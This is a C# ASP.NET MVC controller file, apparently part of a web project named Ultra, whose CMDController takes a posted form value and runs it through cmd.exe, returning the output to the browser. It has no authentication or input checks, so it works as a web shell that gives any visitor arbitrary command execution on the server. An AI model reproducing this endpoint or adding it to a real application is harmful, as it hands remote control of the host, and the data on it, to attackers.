using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace Ultra.Web.Controllers
{
    public class CMDController : Controller
    {
        // GET: CMD
        public ActionResult Index()
        {
            return View(new Dupamodel());
        }

        [HttpPost]
        public ActionResult Index(string commad)
        {
            // Start the child process.
            Process p = new Process();
            // Redirect the output stream of the child process.
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = $"/C {commad}";
            p.Start();
            // Do not wait for the child process to exit before
            // reading to the end of its redirected stream.
            // p.WaitForExit();
            // Read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            return View(new Dupamodel()
            {
                response = output,
                command = commad,
            });
        }
    }

    public class Dupamodel
    {
        public string response { get; set; }
        public string command { get; set; }
    }
}